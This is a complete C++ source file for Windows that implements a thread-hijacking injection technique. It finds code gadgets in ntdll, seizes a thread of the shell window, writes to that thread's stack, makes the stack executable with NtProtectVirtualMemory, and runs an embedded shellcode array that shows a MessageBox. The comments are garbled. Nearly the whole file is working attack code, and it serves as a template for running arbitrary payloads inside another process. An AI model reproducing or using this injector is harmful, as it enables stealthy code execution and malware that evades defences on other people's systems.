#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "Zydis/Zydis.h"


INT EntryPoint = 0x10; // Shellcode���ƫ��

BYTE Shellcode[] = {
	// ���ɵ�shellcode��bug�����[rsp+8]��ַ����д�������Ϊ�˱������ݱ��ƻ���ֻ�ܶ����һ��ȫ0����
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

	0x48,0x89,0x5c,0x24,0x08,0x57,0x48,0x83,0xec,0x20,0x65,0x48,0x8b,0x04,0x25,0x30,
	0x00,0x00,0x00,0x41,0xb9,0xdf,0xff,0x00,0x00,0x48,0x8b,0x48,0x60,0x48,0x8b,0x41,
	0x18,0x4c,0x8b,0x40,0x20,0x49,0x8b,0xd0,0x48,0x8b,0x12,0x48,0x8b,0x4a,0x40,0x0f,
	0xb7,0x41,0x28,0x66,0x83,0xe8,0x4b,0x66,0x41,0x85,0xc1,0x75,0x54,0x0f,0xb7,0x41,
	0x2a,0x66,0x83,0xe8,0x45,0x66,0x41,0x85,0xc1,0x75,0x46,0x0f,0xb7,0x41,0x2c,0x66,
	0x83,0xe8,0x52,0x66,0x41,0x85,0xc1,0x75,0x38,0x0f,0xb7,0x41,0x2e,0x66,0x83,0xe8,
	0x4e,0x66,0x41,0x85,0xc1,0x75,0x2a,0x0f,0xb7,0x41,0x30,0x66,0x83,0xe8,0x45,0x66,
	0x41,0x85,0xc1,0x75,0x1c,0x0f,0xb7,0x41,0x32,0x66,0x83,0xe8,0x4c,0x66,0x41,0x85,
	0xc1,0x75,0x0e,0x66,0x83,0x79,0x34,0x33,0x75,0x07,0x66,0x83,0x79,0x36,0x32,0x74,
	0x63,0x49,0x3b,0xd0,0x75,0x92,0x33,0xdb,0xba,0x5a,0xc1,0xcb,0xc2,0x48,0x8b,0xcb,
	0xe8,0x5b,0x00,0x00,0x00,0xba,0x53,0xc0,0x49,0x9c,0x48,0x8b,0xcb,0x48,0x8b,0xf8,
	0xe8,0x4b,0x00,0x00,0x00,0x48,0x8d,0x0d,0x14,0x01,0x00,0x00,0xff,0xd0,0x48,0x85,
	0xc0,0x74,0x26,0x48,0x8d,0x15,0x16,0x01,0x00,0x00,0x48,0x8b,0xc8,0xff,0xd7,0x48,
	0x85,0xc0,0x74,0x15,0x45,0x33,0xc9,0x4c,0x8d,0x05,0x12,0x01,0x00,0x00,0x48,0x8d,
	0x15,0x13,0x01,0x00,0x00,0x33,0xc9,0xff,0xd0,0x48,0x8b,0x5c,0x24,0x30,0x48,0x83,
	0xc4,0x20,0x5f,0xc3,0x48,0x8b,0x5a,0x20,0xeb,0x9e,0x00,0x00,0x00,0x00,0x00,0x00,
	0x48,0x89,0x74,0x24,0x08,0x48,0x89,0x7c,0x24,0x10,0x48,0x63,0x41,0x3c,0x4c,0x8b,
	0xc1,0x8b,0xf2,0x44,0x8b,0x94,0x08,0x88,0x00,0x00,0x00,0x4c,0x03,0xd1,0x45,0x8b,
	0x4a,0x20,0x41,0x8b,0x7a,0x1c,0x4c,0x03,0xc9,0x48,0x03,0xf9,0x33,0xc9,0x41,0x3b,
	0x4a,0x18,0x73,0x33,0x41,0x8b,0x11,0x49,0x03,0xd0,0x45,0x33,0xdb,0xeb,0x0d,0x45,
	0x6b,0xdb,0x21,0x0f,0xbe,0xc0,0x44,0x03,0xd8,0x48,0xff,0xc2,0x8a,0x02,0x84,0xc0,
	0x75,0xed,0x44,0x3b,0xde,0x74,0x0c,0xff,0xc1,0x49,0x83,0xc1,0x04,0x41,0x3b,0x4a,
	0x18,0x72,0xd1,0x41,0x3b,0x4a,0x18,0x74,0x15,0x8b,0xd1,0x41,0x8b,0x4a,0x24,0x49,
	0x03,0xc8,0x0f,0xb7,0x04,0x51,0x8b,0x04,0x87,0x49,0x03,0xc0,0xeb,0x02,0x33,0xc0,
	0x48,0x8b,0x74,0x24,0x08,0x48,0x8b,0x7c,0x24,0x10,0xc3,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x34,0x06,0x00,0x0a,0x32,0x06,0x70,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0xfa,0x00,0x00,0x00,0x90,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x74,0x02,0x00,0x05,0x64,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x01,0x00,0x00,0x8b,0x01,0x00,0x00,0xb0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x55,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x41,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x00,0x48,0x65,0x6c,0x6c,0x6f,0x00
};

struct GW {
	enum REG { None, Rbx, Rsi, Rdi, End };

	PVOID JMPTOSELFAddress;
	PVOID MOVRETAddress;

	REG Operands[2];
	INT64 Displacement; // λ����
	INT64 PopCount; // POP����
	INT64 RspCompensation; // RSP����
};

GW::REG Translate(ZydisRegister Reg) {

	switch (Reg)
	{
	case ZYDIS_REGISTER_RBX:
		return GW::Rbx;
	case ZYDIS_REGISTER_RSI:
		return GW::Rsi;
	case ZYDIS_REGISTER_RDI:
		return GW::Rdi;
	default:
		return GW::None;
	}
}

DWORD64* Translate(GW::REG Reg, CONTEXT* ThreadContext) {

	switch (Reg)
	{
	case GW::Rbx:
		return &(ThreadContext->Rbx);
	case GW::Rsi:
		return &(ThreadContext->Rsi);
	case GW::Rdi:
		return &(ThreadContext->Rdi);
	default:
		return NULL;
	}
}

BOOL FindJMPTOSELFAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	for (unsigned int i = 0; i < NTDLLCodeSize; i++) {
		if ((NTDLLCode[i] == 0xEB) && (NTDLLCode[i + 1] == 0xFE)) {
			Ghost->JMPTOSELFAddress = NTDLLCode + i;
			return TRUE;
		}
	}

	return FALSE;
}

BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	ZydisDecoder Decoder;
	ZydisDecoderInit(&Decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);

	ZydisDecodedInstruction Instruction;
	ZydisDecodedOperand Operands[ZYDIS_MAX_OPERAND_COUNT];

	INT MAX_INST_ALLOW_COUNT = 5; // MOVRETָ��������������ָ��
	PVOID Terminus = NTDLLCode + NTDLLCodeSize - MAX_INST_ALLOW_COUNT * ZYDIS_MAX_INSTRUCTION_LENGTH;

	for (PVOID RuntimeAddress = NTDLLCode; RuntimeAddress < Terminus;
		RuntimeAddress = (PVOID)((UINT_PTR)RuntimeAddress + Instruction.length)) {

		// ���Խ���
		if (ZYAN_FALSE == ZYAN_SUCCESS(ZydisDecoderDecodeFull(
			&Decoder,
			RuntimeAddress,
			ZYDIS_MAX_INSTRUCTION_LENGTH,
			&Instruction,
			Operands))) {

			// �������ʧ����������ǰ�ֽ�
			RuntimeAddress = (PVOID)((UINT_PTR)RuntimeAddress + 1);
			continue;
		}

		// ��ʼ����д�ṹ��
		Ghost->MOVRETAddress = 0;
		Ghost->Displacement = 0;
		Ghost->PopCount = 0;
		Ghost->RspCompensation = 0;

		//
		// Ѱ�ҷ���������MOVָ��
		//

		if (Instruction.mnemonic != ZYDIS_MNEMONIC_MOV)
			continue;

		// Ҫ���������Ϊ�ڴ棬�Ҳ�����Ϊ�Ĵ���
		if (Operands[0].type != ZYDIS_OPERAND_TYPE_MEMORY || Operands[1].type != ZYDIS_OPERAND_TYPE_REGISTER)
			continue;

		// ����Ҳ����Ƿ�Ϊ���������Ĵ���
		if (Operands[1].reg.value != ZYDIS_REGISTER_RBX &&
			Operands[1].reg.value != ZYDIS_REGISTER_RSI &&
			Operands[1].reg.value != ZYDIS_REGISTER_RDI)
			continue;

		// �����������Ƿ�Ϊ���������Ĵ���
		if (Operands[0].mem.base != ZYDIS_REGISTER_RBX &&
			Operands[0].mem.base != ZYDIS_REGISTER_RSI &&
			Operands[0].mem.base != ZYDIS_REGISTER_RDI)
			continue;

		// ��������Ƿ�����Ҳ�����
		if (Operands[0].mem.base == Operands[1].reg.value)
			continue;

		// ��д�ṹ�屣��Ĵ���
		Ghost->Operands[0] = Translate(Operands[0].mem.base);
		Ghost->Operands[1] = Translate(Operands[1].reg.value);

		// ��д�ṹ�屣��λ��
		if (Operands[0].mem.disp.has_displacement)
			Ghost->Displacement = Operands[0].mem.disp.value;

		//
		// Ѱ�ҷ���������RETָ��
		//

		PVOID PeekAddress = (PVOID)((UINT_PTR)RuntimeAddress + Instruction.length);

		for (int i = 1; i < MAX_INST_ALLOW_COUNT; i++) {

			// �������ʧ�ܾ�ֱ�ӷ���
			if (ZYAN_FALSE == ZYAN_SUCCESS(ZydisDecoderDecodeFull(
				&Decoder,
				PeekAddress,
				ZYDIS_MAX_INSTRUCTION_LENGTH,
				&Instruction,
				Operands)))
				break;

			// �ƶ�����һ��ָ��
			PeekAddress = (PVOID)((UINT_PTR)PeekAddress + Instruction.length);

			// Ѱ�� ret ָ��
			if (Instruction.mnemonic == ZYDIS_MNEMONIC_RET) {

				Ghost->MOVRETAddress = RuntimeAddress;

				return TRUE;
			}

			// ���� mov reg, ?? ָ��
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_MOV) {

				// Ҫ���������Ϊ�Ĵ���
				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER)
					break;
			}

			// ���� add rsp, ?? ָ��
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_ADD) {

				// Ҫ���������Ϊ�Ĵ������Ҳ�����Ϊ������
				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER || Operands[1].type != ZYDIS_OPERAND_TYPE_IMMEDIATE)
					break;

				// ������������rsp���򱣴�������
				if (Operands[0].reg.value == ZYDIS_REGISTER_RSP) {
					if (Operands[1].imm.is_signed)
						Ghost->RspCompensation += Operands[1].imm.value.s;
					else
						Ghost->RspCompensation += Operands[1].imm.value.u;
				}
			}

			// ���� xor reg, ?? ָ��
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_XOR) {

				// Ҫ���������Ϊ�Ĵ���
				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER)
					break;
			}

			// ���� pop reg ָ��
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_POP) {

				Ghost->PopCount += 1;
			}

			// ����������ָ��
			else {
				break;
			}
		}
	}

	return FALSE;
}

BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOSELFAddress)
{
	SetThreadContext(Thread, ThreadContext);

#ifdef DEBUG
	_tprintf(_T("\n"));
	_tprintf(_T("[D] After inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext->Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext->Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext->Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext->Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext->Rip);
#endif // DEBUG

	// �����߳�
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);

	do {
		ResumeThread(Thread);
		Sleep(10);
		SuspendThread(Thread);

		if (GetThreadContext(Thread, ThreadContext) == 0) {
			_tprintf(_T("[x] GetThreadContext failed, error: 0x%x\n"), GetLastError());
			return FALSE;
		}
		
	} while ((PVOID)ThreadContext->Rip != JMPTOSELFAddress);

	return TRUE;
}

BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
{
	// ��ȡ��ǰ�߳�������
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

	// �����������
	DWORD64* Operand0 = Translate(Ghost->Operands[0], &ThreadContext);
	if (Operand0 == NULL) {
		_tprintf(_T("[x] Unsupported operand, Operands[0]: %d\n"), Ghost->Operands[0]);
		return FALSE;
	}

	// �����Ҳ�����
	DWORD64* Operand1 = Translate(Ghost->Operands[1], &ThreadContext);
	if (Operand1 == NULL) {
		_tprintf(_T("[x] Unsupported operand, Operands[1]: %d\n"), Ghost->Operands[1]);
		return FALSE;
	}

	//
	// ����ջ�ռ��С
	//

	// Ԥ��JMPTOSELFAddress��ַ�ռ�
	INT BytesOfJmpToSelfAddress = sizeof(PVOID);

	// Ԥ��NtProtectVirtualMemory�����ռ�
	INT BytesOfNtProtectVirtualMemoryCallFrame = (5 + 3) * sizeof(PVOID);

	// Ԥ��Shellcode�ռ�
	INT BytesOfShellcode = sizeof(Shellcode);

	// Shellcode��NtProtectVirtualMemory����֡ջ����һ���ڴ棬����ȡ�������ֵ
	if (BytesOfShellcode < BytesOfNtProtectVirtualMemoryCallFrame)
		BytesOfShellcode = BytesOfNtProtectVirtualMemoryCallFrame;

	// ȡ sizeof(PVOID) ��������ֵ
	BytesOfShellcode = BytesOfShellcode - (BytesOfShellcode % sizeof(PVOID)) + sizeof(PVOID);

	// ����RSPջ��λ�ã������ջ��������RSP��POP����ƫ��
	DWORD64 StackTopAddress = ThreadContext.Rsp
		- BytesOfJmpToSelfAddress
		- BytesOfShellcode
		- Ghost->RspCompensation				// ����RSP
		- (Ghost->PopCount * sizeof(PVOID));	// ����POP

	// ջ�ڴ�16�ֽڶ���
	StackTopAddress = StackTopAddress - (StackTopAddress % 16);

	//
	// ��һ����RSP����д��JMPTOSELFAddress��ַ
	//

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// Դ�Ĵ������潫Ҫд�������
	*Operand1 = (DWORD64)Ghost->JMPTOSELFAddress;

	// Ŀ�ļĴ������潫Ҫд��ĵ�ַ
	*Operand0 = ThreadContext.Rsp
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID))		// ƽ��POP�Ĳ���
		- Ghost->Displacement;					// ����MOVָ���е�λ�Ƶ�ַ

	// RIPָ��MOVRETAddress
	ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

	// д������
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// �ڶ�����д��NtProtectVirtualMemory����
	//

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// ���Ǹ�fastcall����Լ���ĺ���������˳�� RCX RDX R8 R9��OldAccessProtection����ʹ��ѹջ����
	//
	// NtProtectVirtualMemory �����������£�
	//
	// NTSTATUS NtProtectVirtualMemory(
	//		HANDLE ProcessHandle,
	//		PVOID* BaseAddress,
	//		SIZE_T* NumberOfBytesToProtect,
	//		ULONG NewAccessProtection,
	//		PULONG OldAccessProtection);

	DWORD64 NtProtectVirtualMemoryCallFrame[5 + 3] = { // ���� 5+3 ����иĶ���ǰ���BytesOfNtProtectVirtualMemoryCallFrame�����˸ĵ�

		(DWORD64)-1,						// ջ֡������ ProcessHandle

		ThreadContext.Rsp					// ջ֡������ *BaseAddress��ע������һ������ָ�룬ָ����ʱָ�� BaseAddress
			+ BytesOfJmpToSelfAddress
			+ ((5 + 0) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		ThreadContext.Rsp					// ջ֡������ NumberOfBytesToProtect��ע������һ��ָ�룬ָ����ʱ���� NumberOfBytesToProtect
			+ BytesOfJmpToSelfAddress
			+ ((5 + 1) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		PAGE_EXECUTE_READWRITE,				// ջ֡������ NewAccessProtection

		ThreadContext.Rsp					// ջ֡������ OldAccessProtection��ע������һ��ָ�룬ָ����ʱ���� OldAccessProtection
			+ BytesOfJmpToSelfAddress
			+ ((5 + 2) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),

		ThreadContext.Rsp					// ��ʱָ�� BaseAddress��ָ��Shellcode����
			+ BytesOfJmpToSelfAddress
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		(DWORD64)BytesOfShellcode,			// ��ʱ���� NumberOfBytesToProtect���ڴ汣���Ĵ�С
		
		0									// ��ʱ���� OldAccessProtection������ԭ�ڴ�Ȩ��
	};

	for (int i = 0; i < sizeof(NtProtectVirtualMemoryCallFrame) / sizeof(NtProtectVirtualMemoryCallFrame[0]); i++) {

		// ����RSP
		ThreadContext.Rsp = StackTopAddress;

		// Դ�Ĵ������潫Ҫд�������
		*Operand1 = NtProtectVirtualMemoryCallFrame[i];

		// Ŀ�ļĴ������潫Ҫд��ĵ�ַ
		*Operand0 = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
			+ (Ghost->PopCount * sizeof(PVOID))		// ƽ��POP�Ĳ���
			- Ghost->Displacement;					// ����MOVָ���е�λ�Ƶ�ַ

		// RIPָ��MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// д������
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// ��������ִ��NtProtectVirtualMemory
	//

	// fastcall�������� ջ֡������ ProcessHandle
	ThreadContext.Rcx = NtProtectVirtualMemoryCallFrame[0];

	// fastcall�������� ջ֡������ *BaseAddress��ע������һ������ָ�룬ָ����ʱָ�� BaseAddress
	ThreadContext.Rdx = NtProtectVirtualMemoryCallFrame[1];

	// fastcall�������� ջ֡������ NumberOfBytesToProtect��ע������һ��ָ�룬ָ����ʱ���� NumberOfBytesToProtect
	ThreadContext.R8 = NtProtectVirtualMemoryCallFrame[2];

	// fastcall�������� ջ֡������ NewAccessProtection
	ThreadContext.R9 = NtProtectVirtualMemoryCallFrame[3];

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// ��RSP��׼JMPTOSELFAddress
	ThreadContext.Rsp = ThreadContext.Rsp
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID));	// ƽ��POP�Ĳ���

	// RIPָ��NtProtectVirtualMemory
	ThreadContext.Rip = (DWORD64)NtProtectVirtualMemory;

	// д������
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// ���Ĳ���д��Shellcode
	//

	for (int i = 0; i < BytesOfShellcode / sizeof(PVOID); i++) {

		// ����RSP
		ThreadContext.Rsp = StackTopAddress;

		// Դ�Ĵ������潫Ҫд�������
		*Operand1 = ((DWORD64*)Shellcode)[i];

		// Ŀ�ļĴ������潫Ҫд��ĵ�ַ
		*Operand0 = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
			+ (Ghost->PopCount * sizeof(PVOID))		// ƽ��POP�Ĳ���
			- Ghost->Displacement;					// ����MOVָ���е�λ�Ƶ�ַ

		// RIPָ��MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// д������
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// ���岽��ִ��Shellcode
	//

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// RIPָ��Shellcode
	ThreadContext.Rip = ThreadContext.Rsp
		+ BytesOfJmpToSelfAddress
		+ EntryPoint							// Shellcode���ƫ��
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID));	// ƽ��POP�Ĳ���

	// ��RSP��׼JMPTOSELFAddress
	ThreadContext.Rsp = ThreadContext.Rsp
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID));	// ƽ��POP�Ĳ���

	// д������
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	return TRUE; // Լ����ע����ɺ��̱߳��봦����ͣ״̬
}

int _tmain(int argc, TCHAR* argv[])
{
	// ��ȡntdllģ��
	HMODULE NTDLLBase = GetModuleHandle(_T("ntdll.dll"));
	if (NTDLLBase != NULL) {
		_tprintf(_T("[+] NTDLLBase = %p\n"), NTDLLBase);
	}
	else{
		_tprintf(_T("[x] Failed to get ntdll.dll module\n"));
		return 0;
	}

	// ��ȡntdll��.text�ε�ַ���Լ�.text�δ�С
	PUCHAR NTDLLCode = (PUCHAR)((UINT_PTR)NTDLLBase + 0x1000);
	PIMAGE_NT_HEADERS NTDLLPEHeader = (PIMAGE_NT_HEADERS)((UINT_PTR)NTDLLBase + ((IMAGE_DOS_HEADER*)NTDLLBase)->e_lfanew);
	DWORD NTDLLCodeSize = NTDLLPEHeader->OptionalHeader.SizeOfCode;

	// ��ȡNtProtectVirtualMemory�ĺ�����ַ
	PVOID NtProtectVirtualMemory = (PVOID)GetProcAddress(NTDLLBase, "NtProtectVirtualMemory");
	if (NtProtectVirtualMemory == NULL) {
		_tprintf(_T("[x] Can't get NtProtectVirtualMemory address\n"));
		return 0;
	}

	// ��д�ṹ��
	GW Ghost;

	// ��ȡ����ת��ַ
	if (FindJMPTOSELFAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] JMP SELF Address = %p\n"), Ghost.JMPTOSELFAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find JMP SELF Address\n"));
		return 0;
	}

	// ��ȡת�Ʒ��ص�ַ
	if (FindMOVRETAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] MOV RET Address = %p\n"), Ghost.MOVRETAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find MOV RET Address\n"));
		return 0;
	}

	// ���߳�
	// HWND Window = FindWindow(_T("CalcFrame"), NULL);
	HWND Window = GetShellWindow();
	if (Window == NULL) {
		_tprintf(_T("[x] Can't find target window\n"));
		return 0;
	}

	DWORD ThreadId = GetWindowThreadProcessId(Window, NULL);
	_tprintf(_T("[+] ThreadId = %d\n"), ThreadId);

	HANDLE Thread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, ThreadId);
	if (Thread == NULL) {
		_tprintf(_T("[x] Can't open target thread\n"));
		return 0;
	}

	// ��ͣ�߳�
	SuspendThread(Thread);

	// �����߳������ģ����ڻ�ԭ
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

#ifdef DEBUG
	_tprintf(_T("\n"));
	_tprintf(_T("[D] Before inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext.Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext.Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext.Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext.Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext.Rip);
#endif // DEBUG

	// ��ʼע�룬Լ����ע����ɺ��̱߳��봦����ͣ״̬
	if (Inject(Thread, Window, &Ghost, NtProtectVirtualMemory) == TRUE) {
		_tprintf(_T("[+] Inject success\n"));
	}
	else {
		_tprintf(_T("[-] Inject failed\n"));
	}

	// ��ԭ�߳�
	SetThreadContext(Thread, &ThreadContext);
	ResumeThread(Thread);

	// �����߳�
	PostMessage(Window, WM_USER, 0, 0);

	CloseHandle(Thread);
	return 0;
}
